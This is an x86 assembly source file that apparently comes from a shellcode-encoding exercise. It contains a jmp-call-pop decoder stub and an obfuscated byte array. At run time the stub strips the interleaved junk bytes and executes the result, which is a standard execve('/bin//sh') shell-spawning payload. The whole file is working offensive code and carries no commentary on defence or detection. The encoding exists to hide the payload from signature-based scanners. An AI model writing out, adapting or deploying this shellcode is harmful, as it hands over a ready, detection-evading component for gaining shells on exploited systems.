global _start

section .text
_start:
        jmp short bottom ; push the shellcode

decoder:
 
        pop esi         ; get address of shellcode
        lea edi, [esi]  ; copy to edi
        inc esi         ; move to the first distance position
        inc edi         ; and to the first random byte
 
        mov cl, 75     ; lenght -1 of the encoder shellcode (TO BE CONFIGURED) 
 
decode_loop:
        xor eax, eax	; clean up
        xor ebx, ebx
 
        mov al, byte [edi]  ; get the distance to next valid byte
        add eax, edi        ; set address of the next valid byte in eax
 
        mov bl, byte [eax]  ; get the valid byte
        mov byte [esi], bl  ; rebuild the original shellcode
 
        mov edi, eax        ; update edi
        inc edi             ; next distance
        inc esi             ; next position of a valid byte
 
        loop decode_loop    ;loop
 
the_end:
	jmp short sc	    ; jump to execute the shellcode
 
bottom:
        call decoder  ; put the address of the string on the stack
	sc: db 0x31, 0x1, 0xc0, 0x2, 0x12, 0x50, 0x3, 0x35, 0x4e, 0x68, 0x2, 0x25, 0x2f, 0x2, 0xaf, 0x2f, 0x1, 0x73, 0x2, 0x7, 0x68, 0x4, 0x9d, 0x49, 0x21, 0x68, 0x1, 0x2f, 0x1, 0x62, 0x1, 0x69, 0x1, 0x6e, 0x4, 0x91, 0xa, 0x2, 0x89, 0x3, 0x8a, 0x51, 0xe3, 0x1, 0x50, 0x4, 0x3b, 0xae, 0x18, 0x89, 0x4, 0x5b, 0x8b, 0x29, 0xe2, 0x1, 0x53, 0x4, 0x2c, 0x56, 0x97, 0x89, 0x2, 0x57, 0xe1, 0x1, 0xb0, 0x1, 0x0b, 0x1, 0xcd, 0x4, 0x14, 0xaa, 0x3c, 0x80